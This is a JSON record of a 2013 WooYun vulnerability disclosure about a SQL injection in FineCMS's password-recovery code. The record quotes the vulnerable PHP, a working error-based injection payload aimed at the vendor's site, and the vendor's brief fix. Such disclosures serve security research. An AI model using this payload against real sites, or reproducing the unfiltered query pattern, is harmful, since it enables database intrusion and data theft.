{"id": 59622, "wybug_id": "wooyun-2013-046642", "wybug_title": "finecms sql注入漏洞", "wybug_corp": "dayrui.com", "wybug_author": "想要减肥的胖纸", "wybug_date": "2013-12-25 17:04", "wybug_open_date": "2014-03-25 17:04", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-12-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-12-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-12-28：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-02-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-02-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-03-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-03-25：\t细节向公众公开  简要描述： FineCMS是一款基于PHP+MySql开发的内容管理系统，采用MVC设计模式实现业务逻辑与表现层的适当分离，使网页设计师能够轻松设计出理想的模板，插件化方式开发功能易用便于扩展，支持自定义内容模型和会员模型，并且可以自定义字段，系统内置文章、图片、下载、房产、商品内容模型，系统表单功能可轻松扩展出留言、报名、书籍等功能，实现与内容模型、会员模型相关联，FineCMS可面向中小型站点提供重量级网站建设解决方案 详细说明：  漏洞文件/member/controllers/Login.php\nublic function find() {\t\t\t$step = max(1, (int)$this->input->get('step'));\t\t$error = '';\t\t\t\tif (IS_POST) {\t\t\tswitch ($step) {\t\t\t\tcase 1:\t\t\t\t\tif ($uid = get_cookie('find')) {\t\t\t\t\t\t$this->member_msg(lang('m-093'), dr_member_url('login/find', array('step' => 2, 'uid' => $uid)), 1);\t\t\t\t\t} else {\t\t\t\t\t\t$name = $this->input->post('name');\t\t\t\t\t\t$value = $this->input->post('value');\t\t\t\t\t\t$data = $this->db\t\t\t\t\t\t\t\t\t ->select('uid,username,randcode')\t\t\t\t\t\t\t\t\t ->where($name, $value)\t\t\t\t\t\t\t\t\t ->limit(1)\t\t\t\t\t\t\t\t\t ->get('member')\t\t\t\t\t\t\t\t\t ->row_array();\n$name（email）在sql语句里是字段，$value（asdsad@gmail.com）是值正常语句是这样的\nSELECT `uid`, `username`, `randcode`FROM `dr_member`WHERE `email` = 'asdsad@gmail.com' LIMIT 1\nname参数没过滤 并且没被单引号引起来，这里对应的是email   漏洞证明：  exp\nhttp://www.dayrui.net/member/index.php?c=login&m=findpost:uid=0&name=email=1 AND (SELECT 3002 FROM(SELECT COUNT(*),CONCAT(0x20,(SELECT MID((IFNULL(CAST(version() AS CHAR),0x20)),1,50)),0x20,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)\n\n\n   修复方案：  不懂怎么修复，刚接触代码审计，请百度相关通用防注入的代码。   版权声明：转载请注明来源 想要减肥的胖纸@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：3  确认时间：2013-12-25 17:27 厂商回复： $name = $this->input->post('name', TRUE);$value = $this->input->post('value', TRUE); 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 3, "Ranks": null}